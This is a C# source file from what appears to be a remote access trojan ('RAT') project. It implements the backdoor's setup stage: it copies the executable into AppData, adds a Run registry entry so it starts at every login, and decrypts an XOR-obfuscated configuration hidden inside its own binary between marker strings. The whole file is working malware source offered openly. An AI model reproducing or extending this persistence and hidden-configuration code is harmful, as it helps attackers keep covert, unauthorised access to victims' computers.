using Microsoft.Win32;
using Newtonsoft.Json;
using RAT.Configuration;
using RAT.Interfaces;
using System;
using System.IO;
using System.Text;

namespace RAT.Configurations
{
    /// <summary>
    /// Contains logic to work with backdoor configuration.
    /// </summary>
    public class BackdoorConfigurationLogic : IBackdoorConfigurationLogic
    {
        /// <summary>
        /// This section is needed to get our exe location for self-contained exe. Which by default is launched from .NET dll.
        /// </summary>
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern uint GetModuleFileName(IntPtr hModule, StringBuilder lpFilename, int nSize);

        /// <summary>
        /// Configures our RAT.
        /// Set's up registry key for self-startup, copies exe to other location, and returns JSON configuration from exe.
        /// </summary>
        /// <returns>Backdoor configuration.</returns>
        public BackdoorConfiguration Configure()
        {
            string pathToExe = this.CopyExeToOtherLocation(); // 1 Step - copy exe to AppData.
            this.SetRegistryKeyForApplication(pathToExe); // 2 Step - set registry key.
            return GetBackdoorConfiguration(); // 3 Step - get configuration which is merged into our .exe
        }

        /// <summary>
        /// Copies exe to AppData directory and creates there folder for our exe.
        /// </summary>
        /// <returns>Exex path to our rat in AppData where exe was copied to.</returns>
        private string CopyExeToOtherLocation()
        {
            var pathToAppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var pathToRatInAppData = pathToAppData + "\\RAT"; // Our folder
            var pathToExeInAppData = pathToRatInAppData + "\\RAT.exe"; // Our exe in folder
            if (!Directory.Exists(pathToRatInAppData))
            {
                Directory.CreateDirectory(pathToRatInAppData);
            }

            if (!File.Exists(pathToExeInAppData))
            {
                var ourExeLocation = this.GetExecutablePath();
                File.Copy(ourExeLocation, pathToExeInAppData);
            }

            return pathToExeInAppData;
        }

        /// <summary>
        /// Set's registry key for application self startup.
        /// </summary>
        /// <param name="pathToExe">Path to where exe is located, which should be autolaunched.</param>
        private void SetRegistryKeyForApplication(string pathToExe)
        {
            string entryName = "RAT";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true))
            {
                if (key == null || key.GetValue(entryName) == null)
                {
                    key.SetValue(entryName, pathToExe);
                }
            }
        }

        /// <summary>
        /// Retrieves configuration from JSON file which is merged in our exe process.
        /// </summary>
        /// <returns>Class that represents file configuration.</returns>
        private BackdoorConfiguration GetBackdoorConfiguration()
        {
            // NOTE:
            // THIS IS CONFIGURED ALSO IN OUR EXTERNAL TOOL, WHICH MERGES CONFIGURATION TO .EXE
            // IF ANYTHING IS CHANGED HERE, THEN IT SHOULD BE CHANGED AS WELL IN TOOL AND VICE-VERSA!
            // ----
            byte firstKey = 60; // Out first key for xor encryption
            byte secondKey = 70; // Out second key for xor encryption
            string configurationStartSignature = "RATR8GDKddFkFMEidhhxHzHRAT"; // Our configuration position start identifier in exe
            string configurationEndSignature = "58cERyKedv"; // Our configuration position end identifier in exe
            // ----

            string pathToOurExe = GetExecutablePath();
            byte[] exeFileContents = File.ReadAllBytes(pathToOurExe);
            byte[] configurationStartSignatureInByteFormat = Encoding.ASCII.GetBytes(configurationStartSignature);
            byte[] configurationEndSignatureInByteFormat = Encoding.ASCII.GetBytes(configurationEndSignature);

            long signatureStartPositionInExe = this.GetIndexOfSignatureInExe(exeFileContents, configurationStartSignatureInByteFormat);
            long signatureEndPositionInExe = this.GetIndexOfSignatureInExe(exeFileContents, configurationEndSignatureInByteFormat);
            if (signatureStartPositionInExe == -1 || signatureEndPositionInExe == -1)
            {
                // Huh, forgot to configure?
                // Can't continue without configuration.
                Environment.Exit(0);
            }

            // Cutting out our encrypted configuration, which is just between signatures.
            long configurationStartPosition = signatureStartPositionInExe + configurationStartSignatureInByteFormat.Length;
            long configurationLength = (signatureEndPositionInExe - configurationStartPosition);
            byte[] encryptedConfiguration = new byte[configurationLength];

            // Copy our configuration.
            Array.Copy(
                sourceArray: exeFileContents,
                sourceIndex: configurationStartPosition,
                destinationArray: encryptedConfiguration,
                destinationIndex: 0,
                length: configurationLength);

            string decryptedConfiguration = DecryptConfigurationToString(encryptedConfiguration, firstKey, secondKey);
            return ToJson(decryptedConfiguration);
        }

        /// <summary>
        /// Get's .exe path from self-contained application.
        /// </summary>
        /// <returns>Full path to exe.</returns>
        private string GetExecutablePath()
        {
            int maxPath = 255;
            var builder = new StringBuilder(maxPath);
            GetModuleFileName(IntPtr.Zero, builder, maxPath);
            return builder.ToString();
        }

        /// <summary>
        /// Simply tries to deserialize string into our JSON object.
        /// </summary>
        /// <param name="jsonConfiguration">Our JSON in string representation.</param>
        /// <returns>Deserialized configuration as object.</returns>
        private BackdoorConfiguration ToJson(string jsonConfiguration)
        {
            BackdoorConfiguration configuration = null;
            try
            {
                configuration = JsonConvert.DeserializeObject<BackdoorConfiguration>(jsonConfiguration);
            }
            catch (Exception)
            {
                // Bad json, have you done something manually to configuration/tool?
                // Can't continue without configuration.
                Environment.Exit(0);
            }

            return configuration;
        }

        /// <summary>
        /// Delegates work to decryption method and then converts sequence of bytes to readable JSON string.
        /// </summary>
        /// <param name="encryptedConfiguration">Our JSON encrypted configuration.</param>
        /// <param name="firstKey">First key that configuration must be xor'ed with.</param>
        /// <param name="secondKey">Second key that configuration must be xor'ed with.</param>
        /// <returns>In ideal world it should return clean JSON string.</returns>
        private string DecryptConfigurationToString(byte[] encryptedConfiguration, byte firstKey, byte secondKey)
        {
            byte[] decryptedConfiguration = this.Xor(this.Xor(encryptedConfiguration, firstKey), secondKey); // Double xor.
            return Encoding.ASCII.GetString(decryptedConfiguration);
        }

        /// <summary>
        /// Xors byte-to-byte passed in byte array with passed in key.
        /// </summary>
        /// <param name="bytes">Array of bytes that should be xor'ed.</param>
        /// <param name="key">Key to xor with.</param>
        /// <returns>Xor'ed array of bytes.</returns>
        private byte[] Xor(byte[] bytes, byte key)
        {
            byte[] encryptedBytes = new byte[bytes.Length];
            for (int i = 0; i < bytes.Length; i++)
            {
                encryptedBytes[i] = bytes[i];
                encryptedBytes[i] ^= key;
            }

            return encryptedBytes;
        }

        /// <summary>
        /// Wrapper string search algorithm to find sequence of bytes (signature) in other sequence of bytes (exe)
        /// as there is no built-in method for bytes in C# libs.
        /// </summary>
        /// <param name="exeInByteFormat">Our exe file contents in byte format.</param>
        /// <param name="signatureInByteFormat">Our configuration signature in byte format.</param>
        /// <returns>Position where our signature begins, -1 if not found.</returns>
        private int GetIndexOfSignatureInExe(byte[] exeInByteFormat, byte[] signatureInByteFormat)
        {
            for (int i = 0; i < exeInByteFormat.Length; i++)
            {
                if (IsSequenceOfBytesSameAsInSignature(i, exeInByteFormat, signatureInByteFormat))
                {
                    return i;
                }
            }

            return -1;
        }

        /// <summary>
        /// Simple (naive) string search algorithm to find sequence of bytes (signature) in other sequence of bytes (exe)
        /// as there is no built-in method for bytes in C# libs.
        /// </summary>
        /// <param name="position">Position of possible signature start.</param>
        /// <param name="exeInByteFormat">Our exe file contents in byte format.</param>
        /// <param name="signatureInByteFormat">Our configuration signature in byte format.</param>
        /// <returns>True if sequence is equal to our signature, false otherwise.</returns>
        private bool IsSequenceOfBytesSameAsInSignature(int position, byte[] exeInByteFormat, byte[] signatureInByteFormat)
        {
            int validCount = 0;
            int signatureMaxValidCount = signatureInByteFormat.Length;
            for (int i = position; i < exeInByteFormat.Length; i++)
            {
                if (exeInByteFormat[i] == signatureInByteFormat[validCount])
                {
                    validCount++;
                    if (validCount == signatureMaxValidCount)
                    {
                        return true;
                    }
                }
                else
                {
                    return false;
                }
            }

            return false;
        }
    }
}